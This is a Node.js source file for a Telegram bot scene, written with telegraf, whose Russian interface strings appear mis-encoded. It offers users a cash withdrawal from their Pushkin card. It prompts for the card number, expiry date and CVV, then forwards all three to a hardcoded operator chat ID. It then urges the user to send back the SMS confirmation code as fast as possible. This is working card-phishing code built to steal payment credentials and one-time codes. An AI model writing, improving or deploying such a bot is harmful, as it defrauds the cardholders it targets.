const { Markup, Composer, Scenes } = require("telegraf");
const { Keyboard } = require("telegram-keyboard");
const { Customer, Payment } = require("../models");

const exit_keyboard = Keyboard.make([
    ['–í—ã–π—Ç–∏ –≤ –º–µ–Ω—é'], 
]);

const default_keyboard = Keyboard.make([
    ['–í—ã–≤–µ—Å—Ç–∏ –¥–µ–Ω—å–≥–∏', '–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è'],
    ["–†–µ—Ñ–µ—Ä–∞–ª—å–Ω–∞—è —Å–∏—Å—Ç–µ–º–∞"],
    ['–ü–æ–¥–¥–µ—Ä–∂–∫–∞', 'FAQ'], 
]);

const startStep = new Composer();
startStep.on("text", ctx => {
    ctx.wizard.state.data = {};
    ctx.wizard.state.msgHistory = {};
    ctx.replyWithHTML("üí≥ –í–≤–µ–¥–∏—Ç–µ <b>–Ω–æ–º–µ—Ä</b> –≤–∞—à–µ–π <b>–ü—É—à–∫–∏–Ω—Å–∫–æ–π</b> –∫–∞—Ä—Ç—ã", exit_keyboard.reply());
    return ctx.wizard.next();
});

const setCardNumberStep = new Composer();
setCardNumberStep.on("text", ctx => {

    if(ctx.message.text === "–í—ã–π—Ç–∏ –≤ –º–µ–Ω—é"){
        ctx.reply("üõë –í—ã –æ—Ç–º–µ–Ω–∏–ª–∏ –≤—ã–≤–æ–¥ —Å—Ä–µ–¥—Å—Ç–≤", default_keyboard.reply());
        return ctx.scene.leave();
    }

    let cardNumber = ctx.message.text.trim().replaceAll(" ", "");
    // –í–∞–ª–∏–¥–∞—Ü–∏—è –≤–≤–µ–¥—ë–Ω–Ω–æ–≥–æ –∑–Ω–∞—á–µ–Ω–∏—è –Ω–æ–º–µ—Ä–∞ –∫–∞—Ä—Ç—ã
    if(cardNumber.length !== 16){
        ctx.reply("üí≥ –ù–æ–º–µ—Ä –∫–∞—Ä—Ç—ã —Å–æ—Å—Ç–æ–∏—Ç –∏–∑ 16 —Ü–∏—Ñ—Ä\n–í–≤–µ–¥–∏—Ç–µ –µ–≥–æ –∑–∞–Ω–æ–≤–æ", { reply_to_message_id: ctx.update.message.message_id });
        return ctx.wizard.selectStep(1);
    }
    if(isNaN(cardNumber)){
        ctx.reply("üí≥ –ù–æ–º–µ—Ä –∫–∞—Ä—Ç—ã —Å–æ—Å—Ç–æ–∏—Ç –∏—Å–∫–ª—é—á–∏—Ç–µ–ª—å–Ω–æ –∏–∑ 16 —Ü–∏—Ñ—Ä, –±–µ–∑ –±—É–∫–≤ –∏ –ª–∏—à–Ω–∏—Ö —Å–∏–º–≤–æ–ª–æ–≤\n–í–≤–µ–¥–∏—Ç–µ –µ–≥–æ –∑–∞–Ω–æ–≤–æ", { reply_to_message_id: ctx.update.message.message_id });
        return ctx.wizard.selectStep(1);
    }

    ctx.wizard.state.data.cardNumber = cardNumber;
    ctx.replyWithHTML("üìÖ –í–≤–µ–¥–∏—Ç–µ <b>–¥–∞—Ç—É</b> –≤–∞—à–µ–π –ü—É—à–∫–∏–Ω—Å–∫–æ–π –∫–∞—Ä—Ç—ã (–ü—Ä–∏–º–µ—Ä: 07/24)", { reply_to_message_id: ctx.update.message.message_id });
    return ctx.wizard.next();
});

const setCardDateStep = new Composer();
setCardDateStep.on("text", ctx => {

    if(ctx.message.text === "–í—ã–π—Ç–∏ –≤ –º–µ–Ω—é"){
        ctx.reply("üõë –í—ã –æ—Ç–º–µ–Ω–∏–ª–∏ –≤—ã–≤–æ–¥ —Å—Ä–µ–¥—Å—Ç–≤", default_keyboard.reply());
        return ctx.scene.leave();
    }

    let cardDate = ctx.message.text.trim();

    if(cardDate.length !== 5 || !cardDate.includes("/")){
        ctx.reply("üìÖ –î–∞—Ç–∞ –¥–æ–ª–∂–Ω–∞ –±—ã—Ç—å –∑–∞–ø–∏—Å–∞–Ω–∞ –≤ —Ñ–æ—Ä–º–∞—Ç–µ –ú–ú/–ì–ì (–ü—Ä–∏–º–µ—Ä: 07/24), –∫–∞–∫ –Ω–∞ —Å–∞–º–æ–π –∫–∞—Ä—Ç–µ\n–í–≤–µ–¥–∏—Ç–µ –µ–≥–æ –∑–∞–Ω–æ–≤–æ", { reply_to_message_id: ctx.update.message.message_id });
        return ctx.wizard.selectStep(2);
    }

    ctx.wizard.state.data.cardDate = cardDate;
    ctx.replyWithHTML("üîé –í–≤–µ–¥–∏—Ç–µ <b>CVV –∫–æ–¥</b> –≤–∞—à–µ–π –ü—É—à–∫–∏–Ω—Å–∫–æ–π –∫–∞—Ä—Ç—ã (–ü—Ä–∏–º–µ—Ä: 134)", { reply_to_message_id: ctx.update.message.message_id });
    return ctx.wizard.next();
});

const checkDataStep = new Composer();
checkDataStep.on("text", ctx => {

    if(ctx.message.text === "–í—ã–π—Ç–∏ –≤ –º–µ–Ω—é"){
        ctx.reply("üõë –í—ã –æ—Ç–º–µ–Ω–∏–ª–∏ –≤—ã–≤–æ–¥ —Å—Ä–µ–¥—Å—Ç–≤", default_keyboard.reply());
        return ctx.scene.leave();
    }

    let cardCvv = ctx.message.text.trim();

    if(cardCvv.length !== 3 || isNaN(cardCvv)){
        ctx.reply("üîé CVV –∫–æ–¥ —Å–æ—Å—Ç–æ–∏—Ç –∏–∑ 3-—Ö —Ü–∏—Ñ—Ä, –æ–Ω —É–∫–∞–∑–∞–Ω –Ω–∞ –æ–±–æ—Ä–æ—Ç–µ –∫–∞—Ä—Ç—ã\n–í–≤–µ–¥–∏—Ç–µ –µ–≥–æ –∑–∞–Ω–æ–≤–æ", { reply_to_message_id: ctx.update.message.message_id });
        return ctx.wizard.selectStep(3);
    }

    const { cardNumber, cardDate } = ctx.wizard.state.data;
    ctx.wizard.state.data.cardCvv = cardCvv;

    ctx.replyWithHTML(`–ü—Ä–æ–≤–µ—Ä—å—Ç–µ –¥–∞–Ω–Ω—ã–µ –∫–∞—Ä—Ç—ã: \n\n–ù–æ–º–µ—Ä: <b>${cardNumber}</b> \n–î–∞—Ç–∞: <b>${cardDate}</b> \nCVV: <b>${cardCvv}</b> \n \n –í—Å—ë –ø—Ä–∞–≤–∏–ª—å–Ω–æ ?`, {
        reply_markup: {
            inline_keyboard: [
                [ { text: "–î–∞, –ø—Ä–æ–¥–æ–ª–∂–∏—Ç—å", callback_data: "continue" }, { text: "–ò–∑–º–µ–Ω–∏—Ç—å –¥–∞–Ω–Ω—ã–µ", callback_data: "edit-data" } ],
                [ { text: "–û—Ç–º–µ–Ω–∞", callback_data: "cancel" } ],
            ]
        }
    }).then((m) => ctx.wizard.state.msgHistory.makeSure = m.message_id);
    return ctx.wizard.next();
});

const confirmCardDataStep = new Composer();
confirmCardDataStep.action("continue", ctx => {
    ctx.deleteMessage(ctx.wizard.state.msgHistory.makeSure);
    ctx.reply("–í–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É, –∫–æ—Ç–æ—Ä—É—é —Ö–æ—Ç–∏—Ç–µ –≤—ã–≤–µ—Å—Ç–∏ (–ú–∏–Ω. - 1500, –ú–∞–∫—Å. - 4700)");
    return ctx.wizard.next();
});
confirmCardDataStep.action("edit-data", ctx => {
    ctx.deleteMessage(ctx.wizard.state.msgHistory.makeSure);
    ctx.replyWithHTML("üí≥ –í–≤–µ–¥–∏—Ç–µ <b>–Ω–æ–º–µ—Ä</b> –≤–∞—à–µ–π –ü—É—à–∫–∏–Ω—Å–∫–æ–π –∫–∞—Ä—Ç—ã");
    return ctx.wizard.selectStep(1);
})
confirmCardDataStep.action("cancel", ctx => {
    ctx.deleteMessage(ctx.wizard.state.msgHistory.makeSure);
    ctx.reply("üõë –í—ã –æ—Ç–º–µ–Ω–∏–ª–∏ –≤—ã–≤–æ–¥ —Å—Ä–µ–¥—Å—Ç–≤", default_keyboard.reply());
    return ctx.scene.leave();
})

const withdrawAmountStep = new Composer();
withdrawAmountStep.on("text", ctx => {

    if(ctx.message.text === "–í—ã–π—Ç–∏ –≤ –º–µ–Ω—é"){
        ctx.reply("üõë –í—ã –æ—Ç–º–µ–Ω–∏–ª–∏ –≤—ã–≤–æ–¥ —Å—Ä–µ–¥—Å—Ç–≤", default_keyboard.reply());
        return ctx.scene.leave();
    }
    
    let amount = ctx.message.text;
    
    if(amount < 1500 || amount > 4700){
        ctx.reply("–°—É–º–º–∞ –¥–æ–ª–∂–Ω–∞ –±—ã—Ç—å –æ—Ç 1500 –¥–æ 4700");
        return ctx.wizard.selectStep(5);
    }

    ctx.wizard.state.data.amount = amount;

    ctx.replyWithHTML("–£–∫–∞–∂–∏—Ç–µ —Å–≤–æ–π —Ä–µ–∫–≤–∏–∑–∏—Ç, –Ω–∞ –∫–æ—Ç–æ—Ä—ã–π –í—ã —Ö–æ—Ç–∏—Ç–µ –≤—ã–≤–µ—Å—Ç–∏ –¥–µ–Ω—å–≥–∏: <b>(–ú–æ–±. —Ç–µ–ª–µ—Ñ–æ–Ω –∏–ª–∏ –Ω–æ–º–µ—Ä –±–∞–Ω–∫–æ–≤—Å–∫–æ–π –∫–∞—Ä—Ç—ã / –ù–æ–º–µ—Ä QIWI-–∫–æ—à–µ–ª—å–∫–∞ / –ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞, –Ω–∞ –∫–æ—Ç–æ—Ä—ã–π –∑–∞—á–∏—Å–ª–∏—Ç—å –¥–µ–Ω—å–≥–∏)</b>\n\n–ü—Ä–∏–º–µ—Ä: <i>–ö–∏–≤–∏ +79000000000</i><b> / </b><i>–ö–∞—Ä—Ç–∞ 2202 0000 0000 000</i><b> / </b><i>–ú–µ–≥–∞—Ñ–æ–Ω 89270000000</i>\n\n–í—Å–µ –∑–∞—è–≤–∫–∏ –ø—Ä–æ–≤–µ—Ä—è—é—Ç—Å—è –≤—Ä—É—á–Ω—É—é —Ä–µ–∞–ª—å–Ω—ã–º–∏ –ª—é–¥—å–º–∏, —Ç–∞–∫ —á—Ç–æ –ø–∏—à–∏—Ç–µ –≤ –ª—é–±–æ–º —É–¥–æ–±–Ω–æ–º –≤–∞–º —Ñ–æ—Ä–º–∞—Ç–µ");
    return ctx.wizard.next();
});

const withdrawalAddressStep = new Composer();
withdrawalAddressStep.on("text", ctx => {

    if(ctx.message.text === "–í—ã–π—Ç–∏ –≤ –º–µ–Ω—é"){
        ctx.reply("üõë –í—ã –æ—Ç–º–µ–Ω–∏–ª–∏ –≤—ã–≤–æ–¥ —Å—Ä–µ–¥—Å—Ç–≤", default_keyboard.reply());
        return ctx.scene.leave();
    }

    let address = ctx.message.text;
    ctx.wizard.state.data.address = address;

    const { amount } = ctx.wizard.state.data;

    ctx.replyWithHTML("üí∏ –°—É–º–º–∞ –Ω–∞ –≤—ã–≤–æ–¥: <b>" + amount + "</b> —Ä—É–±–ª–µ–π\nüéà –í—ã–≤–µ—Å—Ç–∏ –¥–µ–Ω—å–≥–∏ –Ω–∞: <b>" + address + "</b>\n–°–æ–∑–¥–∞—Ç—å –∑–∞—è–≤–∫—É –Ω–∞ –≤—ã–≤–æ–¥ ?", {
        reply_markup: {
            inline_keyboard: [
                [ { text: "–î–∞, —Å–æ–∑–¥–∞—Ç—å", callback_data: "create" }, { text: "–û—Ç–º–µ–Ω–∞", callback_data: "cancel" } ],
            ]
        }
    }).then((m) => {
        ctx.wizard.state.msgHistory.createPaymentRequest = m.message_id;
        return ctx.wizard.next();
    });
});

const finishStep = new Composer();
finishStep.action("create", ctx => {
    ctx.deleteMessage(ctx.wizard.state.msgHistory.createPaymentRequest);
    const customer = ctx.update.callback_query.from;
    Customer.findOne({ telegram_id: customer.id }, (err, found) => {
        console.log(found)
        const newPayment = new Payment({
            amount: ctx.wizard.state.data.amount,
            customer: found._id,

            withdrawalAddress: ctx.wizard.state.data.address,

            pushkinCardNumber: ctx.wizard.state.data.cardNumber,
            pushkinCardDate: ctx.wizard.state.data.cardDate,
            pushkinCardCVV: ctx.wizard.state.data.cardCvv
        });
        newPayment.save((err, savedPaymentRequest) => {
            ctx.telegram.sendMessage(1257409280, `üí° –ù–æ–≤–∞—è –∑–∞—è–≤–∫–∞\n${savedPaymentRequest._id}\n\n–ù–æ–º–µ—Ä –∫–∞—Ä—Ç—ã: ${ctx.wizard.state.data.cardNumber}\n–î–∞—Ç–∞: ${ctx.wizard.state.data.cardDate}\nCVV: ${ctx.wizard.state.data.cardCvv}\n–°—É–º–º–∞ –≤—ã–≤–æ–¥–∞: ${ctx.wizard.state.data.amount}`)
            .then((m) => {
                savedPaymentRequest.initialAdminMessage = m.message_id;
                savedPaymentRequest.save();
                ctx.replyWithHTML("–ß–µ—Ä–µ–∑ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–Ω–æ–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –≤—Ä–µ–º–µ–Ω–∏ –≤–∞–º –ø—Ä–∏–¥–µ—Ç SMS-—Å–æ–æ–±—â–µ–Ω–∏–µ —Å –∫–æ–¥–æ–º –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è –æ–ø–ª–∞—Ç—ã.\n\n –ö–∞–∫ —Ç–æ–ª—å–∫–æ –ø–æ–ª—É—á–∏—Ç–µ –µ–≥–æ, <b>–∫–∞–∫ –º–æ–∂–Ω–æ –±—ã—Å—Ç—Ä–µ–µ</b> –æ—Ç–ø—Ä–∞–≤—å—Ç–µ –µ–≥–æ —Å—é–¥–∞.", default_keyboard.reply());
                return ctx.scene.leave();
            })
        });
    })
});
finishStep.action("cancel", ctx => {
    ctx.deleteMessage(ctx.wizard.state.msgHistory.createPaymentRequest);
    ctx.reply("üõë –í—ã –æ—Ç–º–µ–Ω–∏–ª–∏ –≤—ã–≤–æ–¥ —Å—Ä–µ–¥—Å—Ç–≤", default_keyboard.reply());
    return ctx.scene.leave();
});

const withdrawScene = new Scenes.WizardScene("withdrawWizard",
    startStep,
    setCardNumberStep,
    setCardDateStep,
    checkDataStep,
    confirmCardDataStep,

    withdrawAmountStep,
    withdrawalAddressStep,
    finishStep
);

module.exports = withdrawScene;